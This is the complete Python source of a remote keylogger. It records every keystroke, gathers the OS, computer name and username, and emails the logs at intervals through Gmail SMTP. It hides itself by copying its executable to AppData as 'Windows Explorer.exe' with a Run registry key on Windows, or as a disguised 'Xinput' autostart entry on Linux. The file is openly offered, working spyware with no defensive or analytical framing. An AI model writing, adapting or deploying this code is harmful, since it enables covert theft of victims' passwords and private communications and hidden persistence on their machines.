#!/usr/bin/env python
"""
Remote keylogger.
"""
import pynput.keyboard
import threading
import smtplib
import os
import shutil
import subprocess
import sys
import stat
import platform
import getpass

class Keylogger:
    def __init__(self, interval, email, password):
        self.log = "[+] BEGIN LOG "
        self.interval = interval
        self.email = email
        self.password = password
        self.system_info = self.epistem_sys()
    
    def mail_stdout(self, email, password, logfile):
        content = "Subject: Log Report\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + logfile
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, content)
        server.quit()

    def epistem_sys(self):
        uname = platform.uname()
        os = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()
        return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user
    
    def persist(self):
        if (sys.platform.startswith("win")):
            self.persist_windows()
        elif (sys.platform.startswith("linux")):
            self.persist_linux()

    def persist_windows(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            self.log = "[+] BEGIN LOG "
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def persist_linux(self):
        home_config_directory = os.path.expanduser('~') + "/.config/"
        autostart_path = home_config_directory + "/autostart/"
        autostart_file = autostart_path + "xinput.desktop"
        if not os.path.isfile(autostart_file):
            self.log = "[+] BEGIN PERSISTENT LOG "
            try:
                os.makedirs(autostart_path)
            except OSError:
                pass
            destination_file = home_config_directory + "xnput"
            shutil.copyfile(sys.executable, destination_file)
            self.chmod_to_exec(destination_file)
            with open(autostart_file, 'w') as out:
                out.write("[Desktop Entry]\nType=Application\nX-GNOME-Autostart-enabled=true\n")
                out.write("Name=Xinput\nExec=" + destination_file + "\n")
            self.chmod_to_exec(autostart_file)
            subprocess.Popen(destination_file)
            sys.exit()

    def chmod_to_exec(self, file):
        os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)

    def update_log(self, string):
        """
        Updates log.
        """
        self.log += string

    def report_log(self):
        """
        Opens thread to report log at n interval.
        """  
        self.mail_stdout(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_log)
        timer.start()

    def process_keypress(self, key):
        """
        Allocates necessary handling to process each keypress.
        """
        try:
            ephemeral_key = str(key.char)
        except AttributeError:
            if (key == key.space):
                ephemeral_key = " "
            else:
                ephemeral_key = " " + str(key) + " "
        self.update_log(ephemeral_key)

    def start(self):
        """
        Instantiate a new listener obj and begin logger.
        """
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keypress)
        with keyboard_listener:
            self.report_log()
            keyboard_listener.join()